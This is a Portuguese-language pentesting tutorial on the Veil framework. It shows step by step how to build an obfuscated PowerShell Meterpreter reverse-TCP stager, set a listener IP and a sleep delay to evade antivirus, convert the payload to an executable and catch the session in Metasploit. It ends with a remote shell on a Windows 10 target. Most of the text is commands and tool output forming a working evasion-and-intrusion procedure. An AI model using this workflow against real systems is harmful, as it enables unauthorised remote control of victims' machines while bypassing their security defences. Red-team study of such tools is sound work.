# [Veil](https://github.com/Veil-Framework/Veil)

É uma ferramenta usada principalmente em **pentesting e segurança ofensiva**. Ele foi criado para **gerar executáveis maliciosos ofuscados**, com o objetivo de **bypassar antivírus, EDRs e outras soluções de segurança** durante testes controlados de intrusão.

**O quê faz:**
* **Gera payloads**: cria arquivos executáveis a partir de *payloads* do Metasploit ou scripts customizados.
* **Ofusca código**: aplica técnicas de evasão (por exemplo, criptografia, embaralhamento de strings, uso de linguagens diferentes) para dificultar a detecção.
* **Testa contra antivírus**: permite avaliar se as defesas da empresa conseguem identificar um malware customizado.
* **Auxilia Red Teams**: ajuda a simular ataques reais, garantindo que a equipe de segurança treine contra ameaças modernas.

## Criação do payload
```
$ veil                                                                                          
===============================================================================
                             Veil | [Version]: 3.1.14
===============================================================================
      [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
===============================================================================

Main Menu

        2 tools loaded

Available Tools:

        1)      Evasion
        2)      Ordnance

Available Commands:

        exit                    Completely exit Veil
        info                    Information on a specific tool
        list                    List available tools
        options                 Show Veil configuration
        update                  Update Veil
        use                     Use a specific tool
```
Seleção do modo evasão
```
Veil>: use 1
===============================================================================
                                   Veil-Evasion
===============================================================================
      [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
===============================================================================

Veil-Evasion Menu

        41 payloads loaded

Available Commands:

        back                    Go to Veil's main menu
        checkvt                 Check VirusTotal.com against generated hashes
        clean                   Remove generated artifacts
        exit                    Completely exit Veil
        info                    Information on a specific payload
        list                    List available payloads
        use                     Use a specific payload
```
Lista dos payloads disponíveis
```
Veil/Evasion>: list
===============================================================================
                                   Veil-Evasion
===============================================================================
      [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
===============================================================================


 [*] Available Payloads:                                                                          
                                                                                                  
        1)      autoit/shellcode_inject/flat.py

        2)      auxiliary/coldwar_wrapper.py
        3)      auxiliary/macro_converter.py
        4)      auxiliary/pyinstaller_wrapper.py

        5)      c/meterpreter/rev_http.py
        6)      c/meterpreter/rev_http_service.py
        7)      c/meterpreter/rev_tcp.py
        8)      c/meterpreter/rev_tcp_service.py

        9)      cs/meterpreter/rev_http.py
        10)     cs/meterpreter/rev_https.py
        11)     cs/meterpreter/rev_tcp.py
        12)     cs/shellcode_inject/base64.py
        13)     cs/shellcode_inject/virtual.py

        14)     go/meterpreter/rev_http.py
        15)     go/meterpreter/rev_https.py
        16)     go/meterpreter/rev_tcp.py
        17)     go/shellcode_inject/virtual.py

        18)     lua/shellcode_inject/flat.py

        19)     perl/shellcode_inject/flat.py

        20)     powershell/meterpreter/rev_http.py
        21)     powershell/meterpreter/rev_https.py
        22)     powershell/meterpreter/rev_tcp.py
        23)     powershell/shellcode_inject/psexec_virtual.py
        24)     powershell/shellcode_inject/virtual.py

        25)     python/meterpreter/bind_tcp.py
        26)     python/meterpreter/rev_http.py
        27)     python/meterpreter/rev_https.py
        28)     python/meterpreter/rev_tcp.py
        29)     python/shellcode_inject/aes_encrypt.py
        30)     python/shellcode_inject/arc_encrypt.py
        31)     python/shellcode_inject/base64_substitution.py
        32)     python/shellcode_inject/des_encrypt.py
        33)     python/shellcode_inject/flat.py
        34)     python/shellcode_inject/letter_substitution.py
        35)     python/shellcode_inject/pidinject.py
        36)     python/shellcode_inject/stallion.py

        37)     ruby/meterpreter/rev_http.py
        38)     ruby/meterpreter/rev_https.py
        39)     ruby/meterpreter/rev_tcp.py
        40)     ruby/shellcode_inject/base64.py
        41)     ruby/shellcode_inject/flat.py
```
Seleção do payload
```
Veil/Evasion>: use 22
===============================================================================
                                   Veil-Evasion
===============================================================================
      [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
===============================================================================

 Payload Information:
                                                                                                  
        Name:           Pure PowerShell Reverse TCP Stager
        Language:       powershell
        Rating:         Excellent
        Description:    pure windows/meterpreter/reverse_tcp stager, no
                        shellcode

Payload: powershell/meterpreter/rev_tcp selected

 Required Options:
                                                                                                  
Name                    Value           Description
----                    -----           -----------
BADMACS                 FALSE           Checks for known bad mac addresses
DOMAIN                  X               Optional: Required internal domain
HOSTNAME                X               Optional: Required system hostname
LHOST                                   IP of the Metasploit handler
LPORT                   4444            Port of the Metasploit handler
MINBROWSERS             FALSE           Minimum of 2 browsers
MINPROCESSES            X               Minimum number of processes running
MINRAM                  FALSE           Require a minimum of 3 gigs of RAM
PROCESSORS              X               Optional: Minimum number of processors
SLEEP                   X               Optional: Sleep "Y" seconds, check if accelerated
USERNAME                X               Optional: The required user account
USERPROMPT              FALSE           Window pops up prior to payload
UTCCHECK                FALSE           Check that system isn't using UTC time zone
VIRTUALPROC             FALSE           Check for known VM processes

 Available Commands:
                                                                                                  
        back            Go back to Veil-Evasion
        exit            Completely exit Veil
        generate        Generate the payload
        options         Show the shellcode's options
        set             Set shellcode option
```
Configuração do listener

`[powershell/meterpreter/rev_tcp>>]: set LHOST 192.168.1.10`

COnfiguração do sleep (diminuir a probabilidade de detecção)

`[powershell/meterpreter/rev_tcp>>]: set SLEEP 20`

Criação do payload
```
[powershell/meterpreter/rev_tcp>>]: generate
===============================================================================
                                   Veil-Evasion
===============================================================================
      [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
===============================================================================

 [>] Please enter the base name for output files (default is payload): plveil
===============================================================================
                                   Veil-Evasion
===============================================================================
      [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
===============================================================================

 [*] Language: powershell
 [*] Payload Module: powershell/meterpreter/rev_tcp
 [*] PowerShell doesn't compile, so you just get text :)
 [*] Source code written to: /var/lib/veil/output/source/plveil.bat
 [*] Metasploit Resource file written to: /var/lib/veil/output/handlers/plveil.rc

Hit enter to continue...
```
* O arquivo */var/lib/veil/output/source/plveil.bat* é o arquivo de payload.
* O arquivo */var/lib/veil/output/handlers/plveil.rc* é o arquivo metasploit de configuração e execução do listener.

## Convertendo o payload para executável

O arquivo de payload foi gerado em .bat, o que não é conveniente. Para convertê-lo em executável, usamos o app [Bat to Exe Converter](https://github.com/tokyoneon/B2E). 
* Esse é um app windows, portanto é executado no Linus através do wine.

`$ wine Bat_To_Exe_Converter.exe` para a versão 32 bits, ou

`$ wine 'Bat_To_Exe_Converter_(x64).exe'` para a versão 64 bits

Na GUI
- File/Open (Ctrl+O)
- Configure as opções
- Converter/convert

## Execução do ataque

Após o entregar o payload, execute o script  /var/lib/veil/output/handlers/plveil.rc no metasploit-framework:

`$ msfconsole -r /var/lib/veil/output/handlers/plveil.rc`

ou 

`msf6 > resource /var/lib/veil/output/handlers/plveil.rc`
```
[*] Processing /var/lib/veil/output/handlers/plveil.rc for ERB directives.
resource (/var/lib/veil/output/handlers/plveil.rc)> use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
resource (/var/lib/veil/output/handlers/plveil.rc)> set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
resource (/var/lib/veil/output/handlers/plveil.rc)> set LHOST 192.168.1.10
LHOST => 192.168.1.10
resource (/var/lib/veil/output/handlers/plveil.rc)> set LPORT 4444
LPORT => 4444
resource (/var/lib/veil/output/handlers/plveil.rc)> set ExitOnSession false
ExitOnSession => false
resource (/var/lib/veil/output/handlers/plveil.rc)> exploit -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 192.168.1.10:4444 
msf6 exploit(multi/handler) > 
```
Quando o playload for executado na máquina alvo, teremos acesso a ela.
```
meterpreter > getuid
Server username: WIN10\user
meterpreter > shell
Process 276 created.
Channel 1 created.
Microsoft Windows [Version 10.0.19045.2965]
(c) Microsoft Corporation. All rights reserved.

C:\Users\user\Desktop>
```
